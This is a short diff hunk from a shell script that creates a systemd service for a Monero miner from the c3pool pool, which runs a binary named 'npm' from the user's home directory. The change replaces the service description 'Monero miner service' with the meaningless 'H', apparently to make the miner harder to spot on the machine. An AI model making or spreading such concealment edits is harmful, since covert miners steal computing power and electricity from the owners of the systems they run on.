@@ -310,7 +310,7 @@ else
     echo "[*] Creating c3pool_miner systemd service"
     cat >/tmp/c3pool_miner.service <<EOL
 [Unit]
-Description=Monero miner service
+Description=H
 
 [Service]
 ExecStart=$HOME/c3pool/npm --config=$HOME/c3pool/config.json
